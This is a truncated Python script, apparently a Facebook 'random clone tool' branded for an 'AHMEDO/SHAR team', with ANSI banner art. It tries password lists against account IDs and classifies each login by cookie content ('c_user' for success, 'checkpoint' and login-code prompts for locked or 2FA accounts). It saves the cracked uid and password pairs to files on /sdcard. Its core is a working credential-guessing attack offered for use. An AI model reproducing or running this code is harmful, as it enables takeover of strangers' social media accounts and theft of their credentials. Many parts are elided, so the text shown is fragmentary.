...
if ltx > 12:
    ...
    tag = "AM"
logo =f"""{BLUE}==============================
{BLUE}=  ====  ==      ====        =    \033[1;32m 𓆩AHMEDO𓆪
{BLUE}=  ====  ==  ===  ===  =======
{BLUE}=  ====  ==  ====  ==  =======
{BLUE}=  ====  ==  ===  ===  =======      \033[1;32m 𓆩SHAR𓆪
{BLUE}=        ==      ====      ===
{BLUE}=  ====  ==  ===  ===  =======
...
{BLUE}=  ====  ==      ====  =======
==============================
\033[1;37m╔SHAR═════════════════\033[1;33mNONE✯𝐓𝐄𝐀𝐌\033[1;37m══════════════SHAR╗
\033[1;31m│\033[1;32m☞  \033[1;32m𝐀𝐔𝐓𝐇𝐎𝐑     \033[1;31m➟   \033[1;32mAHMED (SHAR)(🕶️)    \033[1;31m│
\033[1;31m│\033[1;32m☞  \033[1;32m𝐅𝐀𝐂𝐄𝐁𝐎𝐎𝐊   \033[1;31m➟   \033[1;32mprince king hu yawr \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐆𝐈𝐓𝐇𝐔𝐁    \033[1;31m ➟   \033[1;32mprivate                           \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏  \033[1;31m ➟   \033[1;32m+************            \033[1;31m │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐕𝐄𝐑𝐒𝐈𝐎𝐍   \033[1;31m ➟   \033[1;32mtesting.                      \033[1;31m   │
\033[1;31m│\033[1;32m☞  \033[1;32m𝐘𝐎𝐔𝐓𝐔𝐁𝐄   \033[1;31m ➟   \033[1;32m************             \033[1;31m   │
\033[1;37m╚ULTRA POWER OF SHAR TEAM BRO{ SHAR }\033[1;37mⒽⒷⒻ╝
\033[1;91m==========================================================
...
#---------------------[MAIN MENU]---------------------#
def xyz():
    os.system("play-audio WELCOME_TO_AHMeD_RANDOM_CLONE_TOOL.mp3")
    os.getuid
        ...
        for ps in pwx:
           ...
           "scheme": 'https',
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m[AHMEDO-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/AHMEDO-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                ...
                if 'Enter login code to continue' in log_cookies:
                    ...
                    print('\r\033[1;34m[AHMEDO-2F] '+uid+' [~] '+ps+' ')
                    open('/sdcard/AHMEDO-2F.txt', 'a').write(uid+' | '+ps+'\n')
                    twf.append(uid)
                else:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                    uid=coki[24:39]
                    ...
                    print(f'\r\033[1;30m[AHMEDO-CP] '+uid+' [×] '+ps+ ' ')
                    open('/sdcard/AHMEDO-CP.txt', 'a').write(uid+' | '+ps+'\n')
                    cp.append(uid)
                    break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AHMEDO 🔥] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[7:22]
                os.system("play-audio HAMII_OK.mp3")
                print('\r\033[1;32m[AHMED(🖤)-OK] '+uid+' [√] '+ps+ '')
                cek_apk(session,coki)
                open('/sdcard/AHMED(🕶️)-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
            elif 'checkpoint' in log_cookies:
                if 'Enter login code to continue' in log_cookies:
                    coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                ...
                continue
        loop+=1
        sys.stdout.write(f'\r\33[1;37m[AHMEDO(🕶️)] [%s] \33[1;97m[OK:%s{hamii2}CP:%s]'%(loop,len(ok),len(cp))), 
        sys.stdout.flush()
        checks(ok,cp)
    except:
        pass
